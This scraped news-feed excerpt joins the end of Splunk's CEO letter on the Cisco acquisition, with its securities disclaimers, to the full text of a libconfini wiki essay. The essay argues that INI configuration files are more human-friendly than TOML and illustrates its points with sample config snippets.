<p>I’m excited by what’s next for Splunk as part of Cisco. For our Splunkers around the globe, today’s announcement is a testament to their hard work, innovative vision and belief that our technology can help organizations all over the world become more resilient and ultimately realize their potential. The talent and drive that made today possible are only going to be more important in the years to come.&nbsp;</p>
<p>Over the years, we’ve created a vibrant community and ecosystem that brings together the most visionary technology minds of our generation. This announcement reinforces our unwavering commitment to helping build a safer and more resilient digital world, and I hope you’ll join us as we celebrate this achievement and continue to write Splunk’s legacy.&nbsp;&nbsp;</p>
<p>For more information, please read our <a href="https://www.splunk.com/en_us/newsroom/press-releases/2023/cisco-to-acquire-splunk-to-help-make-organizations-more-secure-and-resilient-in-an-ai-powered-world.html" target="_blank">press release</a>.</p>
<p>Gary Steele<br>
President &amp; CEO, Splunk</p>
<hr>

<p><b><i>Forward-Looking Statements</i></b></p>
<p><i>This communication contains “forward-looking statements” within the meaning of the federal securities laws, including Section 27A of the Securities Act of 1933, as amended, and Section 21E of the Securities Exchange Act of 1934, as amended. These forward-looking statements are based on Splunk’s current expectations, estimates and projections about the expected date of closing of the proposed transaction and the potential benefits thereof, its business and industry, management’s beliefs and certain assumptions made by Splunk and Cisco, all of which are subject to change. In this context, forward-looking statements often address expected future business and financial performance and financial condition, and often contain words such as “expect,” “anticipate,” “intend,” “plan,” “believe,” “could,” “seek,” “see,” “will,” “may,” “would,” “might,” “potentially,” “estimate,” “continue,” “expect,” “target,” similar expressions or the negatives of these words or other comparable terminology that convey uncertainty of future events or outcomes. All forward-looking statements by their nature address matters that involve risks and uncertainties, many of which are beyond our control, and are not guarantees of future results, such as statements about the consummation of the proposed transaction and the anticipated benefits thereof. These and other forward-looking statements, including the failure to consummate the proposed transaction or to make or take any filing or other action required to consummate the transaction on a timely matter or at all, are not guarantees of future results and are subject to risks, uncertainties and assumptions that could cause actual results to differ materially from those expressed in any forward-looking statements. Accordingly, there are or will be important factors that could cause actual results to differ materially from those indicated in such statements and, therefore, you should not place undue reliance on any such statements and caution must be exercised in relying on forward-looking statements. Important risk factors that may cause such a difference include, but are not limited to: (i) the completion of the proposed transaction on anticipated terms and timing, including obtaining shareholder and regulatory approvals, anticipated tax treatment, unforeseen liabilities, future capital expenditures, revenues, expenses, earnings, synergies, economic performance, indebtedness, financial condition, losses, future prospects, business and management strategies for the management, expansion and growth of Splunk’s business and other conditions to the completion of the transaction; (ii) the impact of the COVID-19 pandemic on Splunk’s business and general economic conditions; (iii) Splunk’s ability to implement its business strategy; (iv) significant transaction costs associated with the proposed transaction; (v) potential litigation relating to the proposed transaction; (vi) the risk that disruptions from the proposed transaction will harm Splunk’s business, including current plans and operations; (vii) the ability of Splunk to retain and hire key personnel; (viii) potential adverse reactions or changes to business relationships resulting from the announcement or completion of the proposed transaction; (ix) legislative, regulatory and economic developments affecting Splunk’s business; (x) general economic and market developments and conditions; (xi) the evolving legal, regulatory and tax regimes under which Splunk operates; (xii) potential business uncertainty, including changes to existing business relationships, during the pendency of the merger that could affect Splunk’s financial performance; (xiii) restrictions during the pendency of the proposed transaction that may impact Splunk’s ability to pursue certain business opportunities or strategic transactions; and (xiv) unpredictability and severity of catastrophic events, including, but not limited to, acts of terrorism or outbreak of war or hostilities, as well as Splunk’s response to any of the aforementioned factors. These risks, as well as other risks associated with the proposed transaction, are more fully discussed in the Proxy Statement to be filed with the U.S. Securities and Exchange Commission in connection with the proposed transaction. While the list of factors presented here is, and the list of factors presented in the Proxy Statement will be, considered representative, no such list should be considered to be a complete statement of all potential risks and uncertainties. Unlisted factors may present significant additional obstacles to the realization of forward looking statements. Consequences of material differences in results as compared with those anticipated in the forward-looking statements could include, among other things, business disruption, operational problems, financial loss, legal liability to third parties and similar risks, any of which could have a material adverse effect on Splunk’s financial condition, results of operations, or liquidity. Splunk does not assume any obligation to publicly provide revisions or updates to any forward-looking statements, whether as a result of new information, future developments or otherwise, should circumstances change, except as otherwise required by securities and other applicable laws.</i></p>
<p><b><i>Important Information and Where to Find It</i></b></p>
<p><i>In connection with the proposed transaction between Splunk Inc. (“Splunk”) and Cisco Systems, Inc. (“Cisco”), Splunk will file with the Securities and Exchange Commission (“SEC”) a proxy statement (the “Proxy Statement”), the definitive version of which will be sent or provided to Splunk stockholders. Splunk may also file other documents with the SEC regarding the proposed transaction. This document is not a substitute for the Proxy Statement or any other document which Splunk may file with the SEC. INVESTORS AND SECURITY HOLDERS ARE URGED TO READ THE PROXY STATEMENT AND ANY OTHER RELEVANT DOCUMENTS THAT ARE FILED OR WILL BE FILED WITH THE SEC, AS WELL AS ANY AMENDMENTS OR SUPPLEMENTS TO THESE DOCUMENTS, CAREFULLY AND IN THEIR ENTIRETY BECAUSE THEY CONTAIN OR WILL CONTAIN IMPORTANT INFORMATION ABOUT THE PROPOSED TRANSACTION AND RELATED MATTERS. Investors and security holders may obtain free copies of the Proxy Statement (when it is available) and other documents that are filed or will be filed with the SEC by Splunk through the website maintained by the SEC at www.sec.gov, Splunk’s investor relations website at <a href="https://investors.splunk.com/" target="_blank">https://investors.splunk.com</a> or by contacting the Splunk investor relations department at the following:</i></p>
<p><i>Splunk Inc.<br>
<a href="mailto:ir@splunk.com" target="_blank">ir@splunk.com</a>&nbsp;<br>
(415) 848-8400</i></p>
<p><b><i>Participants in the Solicitation</i></b></p>
<p><i>Splunk and certain of its directors and executive officers may be deemed to be participants in the solicitation of proxies in respect of the proposed transaction. Information regarding Splunk’s directors and executive officers, including a description of their direct interests, by security holdings or otherwise, is contained in Splunk’s proxy statement for its 2023 annual meeting of stockholders, which was filed with the SEC on May 9, 2023. Splunk stockholders may obtain additional information regarding the direct and indirect interests of the participants in the solicitation of proxies in connection with the proposed transaction, including the interests of Splunk directors and executive officers in the transaction, which may be different than those of Splunk stockholders generally, by reading the Proxy Statement and any other relevant documents that are filed or will be filed with the SEC relating to the transaction. You may obtain free copies of these documents using the sources indicated above.</i></p>

          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[An INI Critique of TOML (2021) (129 pts)]]></title>
            <link>https://github.com/madmurphy/libconfini/wiki/An-INI-critique-of-TOML</link>
            <guid>37595766</guid>
            <pubDate>Thu, 21 Sep 2023 10:41:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/madmurphy/libconfini/wiki/An-INI-critique-of-TOML">https://github.com/madmurphy/libconfini/wiki/An-INI-critique-of-TOML</a>, See on <a href="https://news.ycombinator.com/item?id=37595766">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                <p><em>Be conservative in what you do, be liberal in what you accept from others.</em></p>
<p>— <a href="https://en.wikipedia.org/wiki/Robustness_principle" rel="nofollow">Postel's law</a></p>
<p>Comparing TOML and INI is not straightforward. The first is a unique standard, the second is a federation of dialects. All INI dialects however are well-defined (every INI file is parsed by some application, and by studying a parser's source code it is <a href="https://github.com/madmurphy/libconfini/wiki/INI-formats">possible to deduce its rules</a>), and, if one looks closely, the number of INI dialects actually used in the wild is not infinite. With an inclusive approach in mind, <strong>libconfini</strong> tries to acknowledge, catalog and extend many of them, so that what once was an informal standard becomes a flexible standard engraved by years of common habits. In referring to “the INI format” this document implicitly refers to that fluid format that <strong>libconfini</strong> is able to parse; and such flexibility is referred to as one of the language's intrinsic features.</p>
<p>Although it claims to be a human-friendly language, TOML constitutes a step back into something more robotic and primitive when compared to INI files and <strong>libconfini</strong>'s approach. Some of TOML's problems are shared with JSON, which is a problematic format outside the ECMAScript realm. Other are instead problems that TOML has created on its own. The reasons why this document addresses TOML and not, for example, JSON or YAML are two. The first obvious reason is that TOML's syntax is so similar to INI that it is useful to draw a line in front of other formats' problematic design and explain why INI is something else. The other reason is that, while other formats like YAML modestly define themselves as “official subsets” of JSON (which was not born as a configuration format, but rather as a serialization format), TOML claims to be a “minimal configuration file format” – despite being another, definitely not minimal, JSON preprocessor, with dates.</p>
<p>TOML's syntax is documented at <a href="https://toml.io/en/v1.0.0" rel="nofollow">https://toml.io/en/v1.0.0</a> (at the time of writing its current revision is <a href="https://github.com/toml-lang/toml/tree/8296d6ba97aaaf3151a32a22ed0513301ac650bf">r793.8296d6b</a>). The following paragraphs explain why you might want to avoid TOML for your next configuration file for a C or a C++ application.</p>
<p>Writing a harsh critique of someone else's efforts is never a pleasant task. But it might be a necessary task when these efforts go in the wrong direction. It is possible that at some point TOML designers will fix the issues listed below. If they will do so, they will finally end up re-inventing INI files.</p>
<h2 id="user-content-1-data-types"><a href="#1-data-types">1. Data types</a></h2>
<p>A TOML document syntactically <em>defines</em> data types. This means that writing <code>89</code> and writing <code>"89"</code> are two different things (the first is a number, the second is a string). And this also means that a compliant TOML parser <em>must</em> respond to type changes in a TOML document. Today you write <code>"89"</code>, your application receives a string and everything goes well, but tomorrow you write <code>89</code> and your application <em>must</em> receive a number…</p>
<p>…and crash.</p>
<p>Of course no application would let anyone do that. Any judicious application using TOML for its configuration will be either tolerant towards improper data types, or will be obstinate and refuse type changes. In the first scenario you will have a non-compliant TOML parser (basically an INI parser), in the second scenario you will have a parser slightly more stupid than an INI parser and still non-compliant (it will not allow a TOML document to define a data type). The question is then: why giving the configuration file the power to speak about data types when at the end of the day it does not have this power (the application does)? The whole thing sounds like “You decide. No, wait, I decide.”</p>
<p>In INI files everything is <em>a castable string</em>. It means that an application always receives a string, and such string is always able to produce a boolean, a number, a simple string, or <em>an array of castable strings</em>, without generating errors. But the application decides what to pick up and how to react to it, not the configuration file. If you want to tell the human about it, write it in a comment, but don't give the configuration file the illusion of a power it does not possess.</p>
<h2 id="user-content-2-quotes-in-values"><a href="#2-quotes-in-values">2. Quotes in values</a></h2>
<p>There is also a deeper issue with data types. Imagine the following configuration file:</p>
<div data-snippet-clipboard-copy-content="[server]
continent = Europe"><pre><code>[server]
continent = Europe
</code></pre></div>
<p>The value above is not required to be a string, it is required to be <em>a continent name</em>. Writing</p>
<div data-snippet-clipboard-copy-content="[server]
continent = 1009"><pre><code>[server]
continent = 1009
</code></pre></div>
<p>is not worse than writing</p>
<div data-snippet-clipboard-copy-content="[server]
continent = &quot;Vacuum cleaner&quot;"><pre><code>[server]
continent = "Vacuum cleaner"
</code></pre></div>
<p>There is no award to gain in demanding that a value avoid a syntax that for some reason is reserved for numbers when it must not be a lot of other things either. And it does not make much sense to create a “string data type” when a “continent name data type” would be required – once again: <em>the <code>continent</code> key above does not expect a string, it expects a continent name</em> (which is not a string more than the ASCII characters used to express numbers are).</p>
<p>Instead, without any valid reason, TOML's syntax forces humans to encapsulate anything that is not a number, a boolean or a date in quotes, disregarding the fact that this would incorrectly present <code>Europe</code> as a string (it is an enumeration label to be exact – in configuration files most values tend to be enumeration labels of some sort) and despite humans would not need quotes for understanding when a sequence of characters – like <code>poet</code> – is not a boolean, or a number, or a date – as for the machines, that would not be a hard task either.</p>
<div data-snippet-clipboard-copy-content="[shakespeare]
birth = 1564
death = 1616

# invalid in TOML
job = poet"><pre><code>[shakespeare]
birth = 1564
death = 1616

# invalid in TOML
job = poet
</code></pre></div>
<p>It is probably not a coincidence that one of the first things that <a href="http://hjson.org/" rel="nofollow">the Hjson project</a> did in order to create a dialect of JSON “easy for humans to read and write” was to remove the necessity of using quotes for declaring strings.</p>
<p>TOML's creator claims that unquoted strings are inherently ambiguous. We can try to imagine the following scenario,</p>

<p>where the quotes seem to suggest that also <code>"252.1"</code> (i.e. a string) would be a valid value for the <code>version</code> key. But do they? What about?</p>
<div data-snippet-clipboard-copy-content="version = &quot;252_1%2!3?4-5/6=7&quot;"><pre><code>version = "252_1%2!3?4-5/6=7"
</code></pre></div>
<p>Would that be a valid version string? What other information does quoting <code>252</code> give except that there could also be “something else” than a simple number?</p>
<p>Without a comment that explains exactly how to format the <code>version</code> key there is just no way to make it unambiguous, quotes or not.</p>
<div data-snippet-clipboard-copy-content="#INI

# Please use MAJOR(.MINOR(.REVISION)) here
version = 252.1.0"><pre><code>#INI

# Please use MAJOR(.MINOR(.REVISION)) here
version = 252.1.0
</code></pre></div>
<p>As in a language that has an extensible semantics, in INI files quotes serve the simple purpose of giving hints, expressing literalness, or removing <em>syntactic</em> (not semantic) ambiguity when there is the risk of it, exactly like a human would do. For instance, an INI file would use quotes like the following example does, for indicating that the <code>#</code> character in <code>#fff000</code> does not mark a comment.</p>

<h2 id="user-content-3-case-sensitivity"><a href="#3-case-sensitivity">3. Case sensitivity</a></h2>
<p>TOML's syntax is always case-sensitive, despite the fact that there are situations where a configuration file <em>must</em> be case-insensitive (think of configuration files that map a FAT32 filesystem or HTML tags, for example). INI formats can be either case-sensitive or case-insensitive depending on the application's choice.</p>
<h2 id="user-content-4-unicode-key-names"><a href="#4-unicode-key-names">4. Unicode key names</a></h2>
<p>TOML's syntax forbids non-ASCII key names unless these are surrounded by quotes.</p>
<div data-snippet-clipboard-copy-content="value in € = 345    # valid with libconfini but invalid in TOML"><pre><code>value in € = 345    # valid with libconfini but invalid in TOML
</code></pre></div>
<p>There is no apparent motivation behind this rule, except that of conforming TOML to JSON, and probably a personal habit in dealing with the latter. But although JSON <em>does</em> have a valid reason to do so because of the programming language it has been designed to work with (ECMAScript property names follow the same rule of identifiers), TOML's reason remains somewhat mysterious.</p>
<h2 id="user-content-5-square-brackets"><a href="#5-square-brackets">5. Square brackets</a></h2>
<p>TOML forces arrays to be encapsulated within square brackets (exactly like section paths do), although humans do not need square brackets for recognizing when something is a list.</p>
<div data-snippet-clipboard-copy-content="# not an array in TOML
wishes = apples, cars, elephants, chairs"><pre><code># not an array in TOML
wishes = apples, cars, elephants, chairs
</code></pre></div>
<p>Nested arrays are also not a valid reason for justifying square brackets, since in INI files it is already possible to nest arrays either by using different delimiters for each level,</p>
<div data-snippet-clipboard-copy-content="wishes = \
    apples : oranges : lemons, \
    cars, \
    elephants : tigers, \
    chairs"><pre><code>wishes = \
    apples : oranges : lemons, \
    cars, \
    elephants : tigers, \
    chairs
</code></pre></div>
<p>or by recursively quoting.</p>
<div data-snippet-clipboard-copy-content="wishes = \
    &quot;apples oranges lemons&quot; \
    cars \
    &quot;elephants tigers&quot; \
    chairs"><pre><code>wishes = \
    "apples oranges lemons" \
    cars \
    "elephants tigers" \
    chairs
</code></pre></div>
<p>But there is a more important reason why square brackets are a bad idea in a human-friendly configuration format: one-member arrays. There is no way to convince a human that something composed of only one member is a list (if you think differently, chances are that you are partly non-human). As friendly as they are, INI files behave accordingly, while TOML of course doesn't. Compare this (INI):</p>

<p>with this (TOML):</p>

<p>As in the C language, in INI files <em>a one-member array and a simple value are stored in the same way</em>. Of course you can declare a one-member array in INI files: just write a simple string.</p>
<p>Thanks to this, INI arrays do not constitute a syntactically distinct type and any string can be parsed as an array. If you have ever dealt with m4 macro arguments you will know the beauty of this.</p>
<h2 id="user-content-6-array-delimiters"><a href="#6-array-delimiters">6. Array delimiters</a></h2>
<p>TOML forces arrays to be always comma-separated, although a human can recognize a list even when the separator is a mushroom.</p>
<div data-snippet-clipboard-copy-content="[Super Mario]
wishes = jumping 🍄 sneaking into pipes 🍄 princess Peach 🍄 flying
coins = 39586235"><pre><code>[Super Mario]
wishes = jumping 🍄 sneaking into pipes 🍄 princess Peach 🍄 flying
coins = 39586235
</code></pre></div>
<p><strong>libconfini</strong> does not allow mushrooms either – but for practical, not philosophical reasons (and the library is not human yet) – but you are free to choose any character within the ASCII range as array delimiter and change it as often as you wish. For instance, in an INI file where normally arrays are comma-separated you might decide that an IP address is also an array, but whose members are separated by dots instead of commas – and just because that is what an IP address actually is, and that might be what your application needs.</p>
<h2 id="user-content-7-mixed-arrays"><a href="#7-mixed-arrays">7. Mixed arrays</a></h2>
<p>TOML encourages a nightmare for strongly typed languages like C and C++: mixed arrays. In short, after deciding that a configuration file must express strong types (and nevertheless still allowing <code>"Vacuum cleaner"</code> as a continent name), TOML forces applications to be able to mix them and display some kind of support for something that is natively not supported.</p>
<p>An array that mixes numbers, strings and other arrays is something a C or C++ application would escape from. Although it is possible to reach the same result also with INI, with both TOML and INI a mixed array can be just emulated, <em>never really implemented</em> from the C perspective (we have left an example under <code>examples/miscellanea/toml-like.c</code>, and we would discourage anyone from doing it). The difference between INI and TOML? INI syntax has <em>the power to express</em> mixed arrays but does not require applications to map them as such, TOML does.</p>
<h2 id="user-content-8-composite-configuration-files"><a href="#8-composite-configuration-files">8. Composite configuration files</a></h2>
<p>TOML's syntax forbids to populate sections in different steps (sections are named “tables” in TOML). The following example, understood by a human and an INI parser, would be forbidden in TOML:</p>
<div data-snippet-clipboard-copy-content="[visitors]
list = karl, lisa, Andrew Smith, rick92

[host]
foo = bar

[visitors]          # invalid in TOML
checked = true      # invalid in TOML"><pre><code>[visitors]
list = karl, lisa, Andrew Smith, rick92

[host]
foo = bar

[visitors]          # invalid in TOML
checked = true      # invalid in TOML
</code></pre></div>
<p>Although this might look like an insignificant detail, allowing to populate a configuration file in different steps can come very much in handy when dealing with the composition of several smaller configuration files.</p>
<h2 id="user-content-9-dates"><a href="#9-dates">9. Dates</a></h2>
<p>This is probably the most mysterious part of TOML language. In INI files a value can be <em>interpreted</em> as a boolean, a number, a string, an array, or whatever else you like (although in this last case <strong>libconfini</strong> will not help you). The situation is kind of similar in TOML (without the “whatever else you like” part), except that a value can also be <em>a date</em>.</p>
<p>There is something intriguing in all this. Even forgetting that an application might not need dates at all, why constraining something so particular and that can be formatted in so many different ways into a rigid primitive? Why not doing that for <em>a path</em>? Or <em>a username</em>? Or <em>an email address</em>? Or <em>a regular expression</em>? …Or <em>a continent name</em>? These have all a more constraining semantics than dates.</p>
<p>In INI files a date is either a time stamp or a human-friendly string.</p>
<div data-snippet-clipboard-copy-content="date = &quot;Thu, 30 Aug 2012 12:31:00 GMT&quot;"><pre><code>date = "Thu, 30 Aug 2012 12:31:00 GMT"
</code></pre></div>
<h2 id="user-content-10--empty-key-names"><a href="#10--empty-key-names">10.  Empty key names</a></h2>
<p>Although a human would have no idea of what it could possibly mean (and probably a machine would not do any better), TOML's syntax explicitly allows (but discourages) to assign values to empty key names.</p>
<div data-snippet-clipboard-copy-content="&quot;&quot; = &quot;whatever&quot;     # valid in TOML
'' = 'whatever'     # valid in TOML
= 'whatever'        # invalid in TOML (seriously?)"><pre><code>"" = "whatever"     # valid in TOML
'' = 'whatever'     # valid in TOML
= 'whatever'        # invalid in TOML (seriously?)
</code></pre></div>
<h2 id="user-content-11-arrays-of-tables-aka-arrays-of-sections"><a href="#11-arrays-of-tables-aka-arrays-of-sections">11. Arrays of tables (a.k.a. arrays of sections)</a></h2>
<p>Sometimes what initially appears to be a nice invention can end up being the opposite – yes, this can happen too. We are talking about arrays of tables here (a.k.a. arrays of sections).</p>
<p>Arrays of tables are declared in TOML using the double square bracket notation:</p>
<div data-snippet-clipboard-copy-content="# TOML

[[server]]
ip = &quot;214.252.11.145&quot;
country = &quot;Australia&quot;

[[server]]
ip = &quot;214.252.11.146&quot;
country = &quot;India&quot;

[[server]]
ip = &quot;214.252.11.147&quot;
country = &quot;Sweden&quot;

..."><pre><code># TOML

[[server]]
ip = "214.252.11.145"
country = "Australia"

[[server]]
ip = "214.252.11.146"
country = "India"

[[server]]
ip = "214.252.11.147"
country = "Sweden"

...
</code></pre></div>
<p>Strictly speaking, arrays of tables introduce the concept of “unnamed tables” – <code>server</code> in the example above is not the name of a table, it is the name of <em>a collection of tables, each of which does not have a name</em>. But independently of the syntactical consequences, this feature carries a major problem: it encourages using configuration files as databases.</p>
<p>The common way to deal with similar scenarios in INI files would be that of keeping a common parent section – so that the application can scroll blindly through the sibling subsections – and making the nesting explicit by giving each subsection a name (in fact, the only unnamed section in INI files can be the document's root):</p>
<div data-snippet-clipboard-copy-content="# INI

[server.main]
ip = 214.252.11.145
country = Australia

[server.secondary]
ip = 214.252.11.146
country = India

[server.broken]
ip = 214.252.11.147
country = Sweden

# You can add an infinite number of `server.*` subsections here and use
# arbitrary names, the application will retrieve all of them."><pre><code># INI

[server.main]
ip = 214.252.11.145
country = Australia

[server.secondary]
ip = 214.252.11.146
country = India

[server.broken]
ip = 214.252.11.147
country = Sweden

# You can add an infinite number of `server.*` subsections here and use
# arbitrary names, the application will retrieve all of them.
</code></pre></div>
<p>The INI way is inherently more human-readable (humans like descriptive names), and produces the nice outcome that when the entries have become too many, and naming each of them has become too cumbersome, it is the good sign that you should finally switch to a database format and keep your configuration file clean.</p>
<p>Even <a href="https://github.com/toml-lang/toml/blob/8296d6ba97aaaf3151a32a22ed0513301ac650bf/README.md#Example">TOML's featured example</a> proposes “the INI way”</p>
<div data-snippet-clipboard-copy-content="[servers.alpha]
ip = &quot;10.0.0.1&quot;
role = &quot;frontend&quot;

[servers.beta]
ip = &quot;10.0.0.2&quot;
role = &quot;backend&quot;"><pre><code>[servers.alpha]
ip = "10.0.0.1"
role = "frontend"

[servers.beta]
ip = "10.0.0.2"
role = "backend"
</code></pre></div>
<p>instead of “the TOML way”</p>
<div data-snippet-clipboard-copy-content="[[servers]]
ip = &quot;10.0.0.1&quot;
role = &quot;frontend&quot;

[[servers]]
ip = &quot;10.0.0.2&quot;
role = &quot;backend&quot;"><pre><code>[[servers]]
ip = "10.0.0.1"
role = "frontend"

[[servers]]
ip = "10.0.0.2"
role = "backend"
</code></pre></div>
<p>for presenting the language.</p>
<p>But if this does not convince you, and at the end of the day you really want to play dirty with your configuration files, INI sill offers you its quirks to reach TOML's effect, without the inconvenience of introducing anonymous sections:</p>
<div data-snippet-clipboard-copy-content="# INI

[server.&quot;214.252.11.145&quot;]
country = Australia

[server.&quot;214.252.11.146&quot;]
country = India

[server.&quot;214.252.11.147&quot;]
country = Sweden

..."><pre><code># INI

[server."214.252.11.145"]
country = Australia

[server."214.252.11.146"]
country = India

[server."214.252.11.147"]
country = Sweden

...
</code></pre></div>
<p>It goes without saying that you should not follow TOML in this. INI is not a database format; it targets primarily humans, not machines. If you want to store multiple sections of the same kind, please give them human-friendly names, and have fun.</p>
<h2 id="user-content-12-lack-of-support-for-implicit-keys"><a href="#12-lack-of-support-for-implicit-keys">12. Lack of support for implicit keys</a></h2>
<p>Serialization formats often have shortcuts for expressing a <code>true</code> boolean implicitly. A bare HTML attribute, for instance, is automatically given the <code>"true"</code> value – i.e. the <code>contenteditable</code> attribute in the following example is automatically parsed as <code>contenteditable="true"</code>.</p>
<div data-snippet-clipboard-copy-content="<div contenteditable class=&quot;my-class&quot;></div>"><pre><code>&lt;div contenteditable class="my-class"&gt;&lt;/div&gt;
</code></pre></div>
<p>Similarly, in the following INI fragment from <code>/etc/pacman.conf</code> (<strong>Arch</strong>), <code>Color</code> is an implicit key representing a <code>true</code> boolean – i.e. <code>Color = YES</code>.</p>
<div data-snippet-clipboard-copy-content="HoldPkg = pacman glibc
Architecture = auto
IgnorePkg =
Color
SigLevel = Required DatabaseOptional
LocalFileSigLevel = Optional"><pre><code>HoldPkg = pacman glibc
Architecture = auto
IgnorePkg =
Color
SigLevel = Required DatabaseOptional
LocalFileSigLevel = Optional
</code></pre></div>
<p>TOML lacks support for implicit keys, and key names not followed by an equals sign always constitute syntax errors.</p>
<h2 id="user-content-13-inline-tables-must-remain-inline"><a href="#13-inline-tables-must-remain-inline">13. Inline tables must remain… inline</a></h2>
<p>In addition to the INI way, TOML introduces a duplicate way of declaring sections: “inline tables”. The following TOML example:</p>
<div data-snippet-clipboard-copy-content="# TOML

homepage = { page_header = &quot;Lorem ipsum dolor sit amet, consectetur adipiscing elit.&quot;, page_footer = &quot;Orci varius natoque penatibus et magnis dis parturient montes.&quot; }"><pre><code># TOML

homepage = { page_header = "Lorem ipsum dolor sit amet, consectetur adipiscing elit.", page_footer = "Orci varius natoque penatibus et magnis dis parturient montes." }
</code></pre></div>
<p>is an exact synonym of:</p>
<div data-snippet-clipboard-copy-content="# TOML

[homepage]
page_header = &quot;Lorem ipsum dolor sit amet, consectetur adipiscing elit.&quot;
page_footer = &quot;Orci varius natoque penatibus et magnis dis parturient montes.&quot;"><pre><code># TOML

[homepage]
page_header = "Lorem ipsum dolor sit amet, consectetur adipiscing elit."
page_footer = "Orci varius natoque penatibus et magnis dis parturient montes."
</code></pre></div>
<p>Besides the visual inconvenience of presenting entire sections like keys, not much would be wrong with this feature, not even the redundancy, had the feature not come with an ugly rule attached: inline tables must remain inline.</p>
<p>Such a coercion would become tolerable after being reminded that in that language a new line is supposed to end a node, if only there had not been an exception that makes it intolerable: arrays, on the contrary, can span multiple lines.</p>
<p>Thus, you can write,</p>
<div data-snippet-clipboard-copy-content="# TOML

homepage = [
	&quot;Lorem ipsum dolor sit amet, consectetur adipiscing elit.&quot;,
	&quot;Orci varius natoque penatibus et magnis dis parturient montes.&quot;
]"><pre><code># TOML

homepage = [
	"Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
	"Orci varius natoque penatibus et magnis dis parturient montes."
]
</code></pre></div>
<p>but you cannot write</p>
<div data-snippet-clipboard-copy-content="# Invalid TOML example

homepage = {
	page_header = &quot;Lorem ipsum dolor sit amet, consectetur adipiscing elit.&quot;,
	page_footer = &quot;Orci varius natoque penatibus et magnis dis parturient montes.&quot;
}"><pre><code># Invalid TOML example

homepage = {
	page_header = "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
	page_footer = "Orci varius natoque penatibus et magnis dis parturient montes."
}
</code></pre></div>
<p>What makes things worse is the fact that this prohibition exists only for the sake of not having two ways of declaring tables that are both multi-line. It is “a moral prohibition”, not dictated by any practical reasons. In short, it exists only for telling you how to behave.</p>
<p>TOML's designers insist saying that allowing multi-line tables declared in this way would break one of TOML's pillars, which is precisely that of terminating a node when a (non-escaped) new line is found. But that is one of INI's pillars, not TOML's: TOML had already betrayed this principle after establishing its array syntax. Looking at the asymmetry above from a different perspective, one could indeed say that the original mistake lies with arrays, not with inline tables (but however one puts it, a mistake lies somewhere).</p>
<p>It is possible to argue further that inline tables bring TOML's syntax closer to JSON. That alone is a good reason to be happy that inline tables are alien in INI files.</p>
<h2 id="user-content-14-incompatibility"><a href="#14-incompatibility">14. Incompatibility</a></h2>
<p>By design TOML is explicitly incompatible with about fourty years of configuration files.</p>
<h2 id="user-content-15-immediacy"><a href="#15-immediacy">15. Immediacy</a></h2>
<p>A configuration file is meant to be edited by a human – possibly someone who has only <strong>Microsoft Notepad</strong> as text editor and has never heard of TOML or INI before – and editing it should feel like a natural and welcomed thing to do, not like hacking a program source code, especially if this does not give any expressive advantage.</p>
<p>If a person who has never heard of TOML sees the following configuration file,</p>
<div data-snippet-clipboard-copy-content="# TOML

[&quot;bank&quot;]
&quot;ip&quot; = &quot;192.168.1.1&quot;
&quot;square root&quot; = 15000

[&quot;client&quot;]
&quot;hello world&quot; = [&quot;sunny&quot;]
&quot;foo&quot; = &quot;9234&quot;"><pre><code># TOML

["bank"]
"ip" = "192.168.1.1"
"square root" = 15000

["client"]
"hello world" = ["sunny"]
"foo" = "9234"
</code></pre></div>
<p>how is the person supposed to know that <code>"ip"</code> can be written also without quotes, but that is not the case of <code>"square root"</code>, as this contains spaces and keys containing spaces must be always quoted? or that the string <code>["sunny"]</code> is not a reference to a section name but is an array instead? or what data types a particular array can contain?</p>
<p>INI, on the other hand, encourages human-friendly comments for explaining what is not immediately visible.</p>
<div data-snippet-clipboard-copy-content="# INI

[bank]
ip = 192.168.1.1
square root = 15000

[client]
hello world = sunny  # it is possible to write a comma-separated list here
foo = 9234"><pre><code># INI

[bank]
ip = 192.168.1.1
square root = 15000

[client]
hello world = sunny  # it is possible to write a comma-separated list here
foo = 9234
</code></pre></div>
<p>You can write comments in TOML as well, of course. But the risk is that they end up being lists of things to avoid that have nothing to do with the application you are configuring, rather than suggestions of what is possible to do.</p>
<div data-snippet-clipboard-copy-content="# TOML

[&quot;bank&quot;]
&quot;ip&quot; = &quot;192.168.1.1&quot;    # you can remove the quotes from `&quot;ip&quot;` if you want
&quot;square root&quot; = 15000   # do not remove the quotes from `&quot;square root&quot;`, TOML forbids it

[&quot;client&quot;]
&quot;hello world&quot; = [&quot;sunny&quot;]   # `[&quot;sunny&quot;]` is not a section name
&quot;foo&quot; = &quot;9234&quot;  # do not remove the quotes from `&quot;9234&quot;`, it is not a number (I know...)"><pre><code># TOML

["bank"]
"ip" = "192.168.1.1"    # you can remove the quotes from `"ip"` if you want
"square root" = 15000   # do not remove the quotes from `"square root"`, TOML forbids it

["client"]
"hello world" = ["sunny"]   # `["sunny"]` is not a section name
"foo" = "9234"  # do not remove the quotes from `"9234"`, it is not a number (I know...)
</code></pre></div>
<h2 id="user-content-16-genesis"><a href="#16-genesis">16. Genesis</a></h2>
<p>Configuration files are born out of necessity, and different applications can have different requirements. There are cases where a configuration file differs substantially from the INI format. It is not rare in these situations that developers have ended up abandoning a widespread and solid configuration format such as INI only after realizing that they had no other choice and not without pain.</p>
<p>In this respect, the way <strong>libconfini</strong> was born is paradigmatic. It was born for an application – an editor – and that application had a very peculiar task: read different types of INI files written in the real world for the applications typically installed on a <strong>GNU/Linux</strong> distribution. What a better scenario for creating a parser?</p>
<p>The genesis of TOML instead is quite different. Someone without a parser <a href="https://github.com/toml-lang/toml/issues/411#issuecomment-219203431">decided that unquoted strings in INI files <em>are ugly</em> and forbad them</a>. A lot of rules have then been added afterwards on paper, without really thinking of any real case usage and only keeping JSON as a reference point.</p>
<p>In the beginning it was still only a specification. Many people, enthusiastic finally to read <em>a specification of something somewhere</em>, started to create their own parser for the newborn language. And that was the moment when problems began to appear.</p>
<p>When you write a parser you might indeed begin to notice contradictions in an apparently unflawed rule, your code might start to become unnecessarily complex because of absurd edge cases, and you might realize that the language you are trying to parse is not that well-designed after all.</p>
<p>And even if you do survive the process of writing a parser that is fully compliant with TOML (<a href="https://github.com/avakar/pytoml/issues/15#issuecomment-217739462">some people don't</a>), you still have done only half of the job, that of writing a parser, without really thinking of any real case usage. It is still possible that you have completely wasted your time after all.</p>
